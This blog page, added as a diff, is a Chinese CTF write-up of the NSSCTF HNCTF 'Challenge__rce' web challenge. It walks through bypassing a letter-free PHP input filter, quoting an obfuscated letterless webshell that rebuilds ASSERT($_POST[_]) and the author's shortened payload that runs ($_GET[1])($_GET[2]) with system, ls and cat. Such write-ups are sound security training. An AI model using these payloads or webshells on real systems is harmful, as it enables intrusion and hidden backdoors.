@@ -1,0 +1,288 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>NSSCTF-HNCTF-[Week1]Challenge__rce | 章小豫的博客</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="废话不多说，直接分析题目。 进入题目，发现一个提示，  既然灵感是来自ctfshou吃瓜杯，那么吃瓜杯的解题思路也应该适用本题，先进入靶机看下题目，发现一片空白，  自然先按F12看源码里有没有提示信息，发现?hint，  试着用GET传一个hint&#x3D;1参数，提交后出现源码，是一个RCE，  分析下就是用POST传一个rce参数，但是长度不能超过120，而且又过滤了全部字母，以及大多数符">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NSSCTF-HNCTF-[Week1]Challenge__rce">
+<meta property="og:url" content="http://example.com/2022/10/16/NSSCTF-HNCTF-Week1-Challenge-rce/index.html">
+<meta property="og:site_name" content="章小豫的博客">
+<meta property="og:description" content="废话不多说，直接分析题目。 进入题目，发现一个提示，  既然灵感是来自ctfshou吃瓜杯，那么吃瓜杯的解题思路也应该适用本题，先进入靶机看下题目，发现一片空白，  自然先按F12看源码里有没有提示信息，发现?hint，  试着用GET传一个hint&#x3D;1参数，提交后出现源码，是一个RCE，  分析下就是用POST传一个rce参数，但是长度不能超过120，而且又过滤了全部字母，以及大多数符">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2022/10/16/NSSCTF-HNCTF-Week1-Challenge-rce/0.png">
+<meta property="og:image" content="http://example.com/2022/10/16/NSSCTF-HNCTF-Week1-Challenge-rce/1.png">
+<meta property="og:image" content="http://example.com/2022/10/16/NSSCTF-HNCTF-Week1-Challenge-rce/2.png">
+<meta property="og:image" content="http://example.com/2022/10/16/NSSCTF-HNCTF-Week1-Challenge-rce/4.png">
+<meta property="og:image" content="http://example.com/2022/10/16/NSSCTF-HNCTF-Week1-Challenge-rce/5.png">
+<meta property="og:image" content="http://example.com/2022/10/16/NSSCTF-HNCTF-Week1-Challenge-rce/6.png">
+<meta property="og:image" content="http://example.com/2022/10/16/NSSCTF-HNCTF-Week1-Challenge-rce/7.png">
+<meta property="article:published_time" content="2022-10-16T14:42:58.000Z">
+<meta property="article:modified_time" content="2022-10-17T05:19:39.583Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="网络安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/10/16/NSSCTF-HNCTF-Week1-Challenge-rce/0.png">
+  
+    <link rel="alternate" href="/atom.xml" title="章小豫的博客" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">章小豫的博客</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-NSSCTF-HNCTF-Week1-Challenge-rce" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/10/16/NSSCTF-HNCTF-Week1-Challenge-rce/" class="article-date">
+  <time class="dt-published" datetime="2022-10-16T14:42:58.000Z" itemprop="datePublished">2022-10-16</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/CTF-web-writeup/">CTF_web_writeup</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      NSSCTF-HNCTF-[Week1]Challenge__rce
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>废话不多说，直接分析题目。</p>
+<p>进入题目，发现一个提示，</p>
+<p><img src="/2022/10/16/NSSCTF-HNCTF-Week1-Challenge-rce/0.png"></p>
+<p>既然灵感是来自ctfshou吃瓜杯，那么吃瓜杯的解题思路也应该适用本题，先进入靶机看下题目，发现一片空白，</p>
+<p><img src="/2022/10/16/NSSCTF-HNCTF-Week1-Challenge-rce/1.png"></p>
+<p>自然先按F12看源码里有没有提示信息，发现?hint，</p>
+<p><img src="/2022/10/16/NSSCTF-HNCTF-Week1-Challenge-rce/2.png"></p>
+<p>试着用GET传一个hint&#x3D;1参数，提交后出现源码，是一个RCE，</p>
+<p><img src="/2022/10/16/NSSCTF-HNCTF-Week1-Challenge-rce/4.png"></p>
+<p>分析下就是用POST传一个rce参数，但是长度不能超过120，而且又过滤了全部字母，以及大多数符号，看下最后能用的字符只有</p>
+<p>0-9，$、_、[]、{}这些字符。只用无字符咋能RCE啊？没什么思路，看下题目那里的提示，CTFshow吃瓜杯，百度搜下writeup，</p>
+<p>发现了一篇p神写的无数字字符的webshell的博客，<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p>
+<p>总结下文章主要内容，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>， 如何编写一个不使用数字和字母的webshell？</span><br><span class="line">    </span><br><span class="line">首先，明确思路。我的核心思路是，将非字母、数字的字符经过各种变换，最后能构造出a-z中任意一个字符。然后再利用PHP允许动态函数执行的</span><br><span class="line">特点，拼接处一个函数名，如“assert”，然后动态执行之即可。</span><br><span class="line">有三个方法，异或，取反，自增，本题使用的是第三个方法，前两个方法为什么用不了，文章里有说明。</span><br><span class="line">    </span><br><span class="line"><span class="number">2</span>， 方法三的主要原理是，</span><br><span class="line">    </span><br><span class="line">在处理字符变量的算数运算时，PHP 沿袭了 Perl 的习惯，而非 C 的。例如，在 Perl 中 <span class="variable">$a</span> = <span class="string">&#x27;Z&#x27;</span>; <span class="variable">$a</span>++; 将把 <span class="variable">$a</span> 变成<span class="string">&#x27;AA&#x27;</span>，而在 C </span><br><span class="line">中，a = <span class="string">&#x27;Z&#x27;</span>; a++; 将把 a 变成 <span class="string">&#x27;[&#x27;</span>（<span class="string">&#x27;Z&#x27;</span> 的 ASCII 值是 <span class="number">90</span>，<span class="string">&#x27;[&#x27;</span> 的 ASCII 值是 <span class="number">91</span>）。注意字符变量只能递</span><br><span class="line">增，不能递减，并且只支持纯字母（a-z 和 A-Z）。递增／递减其他字符变量则无效，原字符串没有变化。</span><br><span class="line">也就是说，<span class="string">&#x27;a&#x27;</span>++ =&gt; <span class="string">&#x27;b&#x27;</span>，<span class="string">&#x27;b&#x27;</span>++ =&gt; <span class="string">&#x27;c&#x27;</span>... 所以，我们只要能拿到一个变量，其值为a，通过自增操作即可获得a-z中所有字符。</span><br><span class="line">那么，如何拿到一个值为字符串<span class="string">&#x27;a&#x27;</span>的变量呢？</span><br><span class="line">巧了，数组（Array）的第一个字母就是大写A，而且第<span class="number">4</span>个字母是小写a。也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-</span><br><span class="line">Z的所有字母。在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为Array：</span><br><span class="line">再取这个字符串的第一个字母，就可以获得<span class="string">&#x27;A&#x27;</span>了。然后利用递增，可以获取A-Z所有字符</span><br><span class="line">    </span><br><span class="line"><span class="number">3</span>,  利用这个技巧，我编写了如下命令为<span class="title function_ invoke__">ASSERT</span>(<span class="variable">$_POST</span>[]);的webshell（因为PHP函数是大小写不敏感的，所以我们最终执行的是，无需获取小写a）</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[];</span><br><span class="line"><span class="variable">$_</span>=@<span class="string">&quot;<span class="subst">$_</span>&quot;</span>; <span class="comment">// $_=&#x27;Array&#x27;;</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>]; <span class="comment">// $_=$_[0];</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$_</span>; <span class="comment">// A</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// E </span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// R</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// T</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// P</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// O</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// T</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$$____</span>;</span><br><span class="line"><span class="variable">$___</span>(<span class="variable">$_</span>[_]); <span class="comment">// ASSERT($_POST[_]);</span></span><br></pre></td></tr></table></figure>
+
+<p>这个思路对本题来说是正确的，但写本题的webshell还需一些更改，比如博客里获取Array是通过@.”[]”得到的，但是本题的@是被过滤了，$没有被过滤，所以使用以下代码获取字符A </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$_=$;$_=$_.[];//此时的$_为Array</span><br><span class="line">$__=$_[0]//$__为A </span><br><span class="line"></span><br><span class="line">由于参数rce有长度限制，所以要尽可能的简化代码，</span><br><span class="line"></span><br><span class="line">上面的代码可以简化为</span><br><span class="line">$_.=[];//不用定义$_=$，直接只用.拼接[],此时$_为Array</span><br><span class="line">$_=$_[0];//$_为A</span><br></pre></td></tr></table></figure>
+
+<p>这里还需要了解PHP 前自增加和后自增加的区别，百度结果如下，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">前自增加：</span><br><span class="line"></span><br><span class="line">$b = 1;</span><br><span class="line">$a = ++$b;       //此语句等同于： $b=$b+1; $a=$b；</span><br><span class="line">echo &#x27;$a=&#x27;.$a;</span><br><span class="line">echo &#x27;&lt;br&gt;&#x27;;</span><br><span class="line">echo &#x27;$b=&#x27;.$b;</span><br><span class="line">解释：前递增++$b,把$b的值增加了1后再返回给$b和$a</span><br><span class="line">结果：</span><br><span class="line">$a=2</span><br><span class="line">$b=2</span><br><span class="line"> </span><br><span class="line">后自增加：</span><br><span class="line">$b = 1;</span><br><span class="line">$a = $b++;      // 此语句等同于： $a=$b; $b=$b+1；</span><br><span class="line">echo &#x27;$a=&#x27;.$a;</span><br><span class="line">echo &#x27;&lt;br&gt;&#x27;;</span><br><span class="line">echo &#x27;$b=&#x27;.$b;</span><br><span class="line">结果：</span><br><span class="line">$a=1</span><br><span class="line">$b=2</span><br></pre></td></tr></table></figure>
+
+<p>第一次写的payload为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>.=[];<span class="comment">//$_为Array</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>[<span class="number">1</span>];<span class="comment">//$__为r</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="number">3</span>];<span class="comment">//$_为a</span></span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_0</span>=<span class="variable">$_</span>++;<span class="comment">//$_0为c，$_为d</span></span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//$_为g</span></span><br><span class="line"><span class="variable">$_1</span>=++<span class="variable">$_</span>;<span class="comment">//$_、$_1为h</span></span><br><span class="line"><span class="variable">$_3</span>=<span class="variable">$_0</span>.<span class="variable">$_1</span>.<span class="variable">$__</span>[<span class="number">1</span>];<span class="comment">//$_3为chr</span></span><br><span class="line"><span class="variable">$_4</span>=_.<span class="variable">$_3</span>(<span class="number">71</span>).<span class="variable">$_3</span>(<span class="number">69</span>).<span class="variable">$_3</span>(<span class="number">84</span>);<span class="comment">//利用php的chr函数得到_GET字符</span></span><br><span class="line">(<span class="variable">$$_4</span>[<span class="number">1</span>])(<span class="variable">$$_4</span>[<span class="number">2</span>]);<span class="comment">//拼接得到($_GET[1])($_GET[2])</span></span><br></pre></td></tr></table></figure>
+
+<p>但是URL编码后提交，会显示too long!</p>
+<p>那么还需要简化下payload。</p>
+<p>观察下，发现可以利用把</p>
+<p><code>$_1=++$_;//$_、$_1为h $_3=$_0.$_1.$__[1];//$_3为chr</code></p>
+<p>合并起来，并且开始的    <code>$__=$_[1];//$__为r</code>   可以删除，然后与上面的合并。</p>
+<p>总的来说就是利用<strong>后自增加</strong> 然后将$_变为h时，然后直接拼接成chr字符。</p>
+<p>合并后代码，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$__</span>.=[];<span class="comment">//$__不用定义为$，最后为$__为Array，</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$__</span>[<span class="number">3</span>];<span class="comment">//$_为a</span></span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_0</span>=<span class="variable">$_</span>++;<span class="comment">//$_开始为c，然后先赋值给$_0，然后再自增为d</span></span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//这时的$_为g</span></span><br><span class="line"><span class="variable">$_0</span>.=++<span class="variable">$_</span>.<span class="variable">$__</span>[<span class="number">1</span>];<span class="comment">//$_开始为g，然后自增为h，$__[]为开始的Array，没有变,那么$__[1]为r。$_0为c，拼接后$_0为chr</span></span><br><span class="line"><span class="variable">$_4</span>=_.<span class="variable">$_0</span>(<span class="number">71</span>).<span class="variable">$_0</span>(<span class="number">69</span>).<span class="variable">$_0</span>(<span class="number">84</span>);<span class="comment">//$_4为_GET</span></span><br><span class="line">(<span class="variable">$$_4</span>[<span class="number">1</span>])(<span class="variable">$$_4</span>[<span class="number">2</span>]);<span class="comment">//($_GET[1])($_GET[2])</span></span><br></pre></td></tr></table></figure>
+
+<p>用GET提交?hint&#x3D;1&amp;1&#x3D;system&amp;2&#x3D;ls，payload通过POST然后经URL编码，提交发现ls命令执行成功</p>
+<p><img src="/2022/10/16/NSSCTF-HNCTF-Week1-Challenge-rce/5.png"></p>
+<p>接下来依次执行ls &#x2F;</p>
+<p><img src="/2022/10/16/NSSCTF-HNCTF-Week1-Challenge-rce/6.png"></p>
+<p>最后直接cat &#x2F;ffflllaaaggg，找到flag</p>
+<p><img src="/2022/10/16/NSSCTF-HNCTF-Week1-Challenge-rce/7.png"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/10/16/NSSCTF-HNCTF-Week1-Challenge-rce/" data-id="cl9hxjpfq000q78v462in0ftu" data-title="NSSCTF-HNCTF-[Week1]Challenge__rce" class="article-share-link">分享</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/10/19/NSWSTAR-week2-UnserializeOne/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">前一篇</strong>
+      <div class="article-nav-title">
+        
+          NSWSTAR-week2-UnserializeOne
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/10/15/CTFHUB-SSRF-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">后一篇</strong>
+      <div class="article-nav-title">CTFHUB-SSRF-端口扫描</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">分类</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTFHUB-web-writeup/">CTFHUB_web_writeup</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-web-writeup/">CTF_web_writeup</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web%E5%89%8D%E7%AB%AF/">web前端</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/10/">十月 2022</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/10/20/NSSCTF-SWPUCTF-ez-ez-unserialize/">由NSSCTF-SWPUCTF-ez_ez_unserialize，对反序列具体详细过程以及对__construct，__destruct函数执行情况的具体分析</a>
+          </li>
+        
+          <li>
+            <a href="/2022/10/19/NSWSTAR-week2-UnserializeOne/">NSWSTAR-week2-UnserializeOne</a>
+          </li>
+        
+          <li>
+            <a href="/2022/10/16/NSSCTF-HNCTF-Week1-Challenge-rce/">NSSCTF-HNCTF-[Week1]Challenge__rce</a>
+          </li>
+        
+          <li>
+            <a href="/2022/10/15/CTFHUB-SSRF-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/">CTFHUB-SSRF-端口扫描</a>
+          </li>
+        
+          <li>
+            <a href="/2022/10/15/CTFHUB-SSRF-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6/">CTFHUB-SSRF-伪协议读取文件</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2022 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
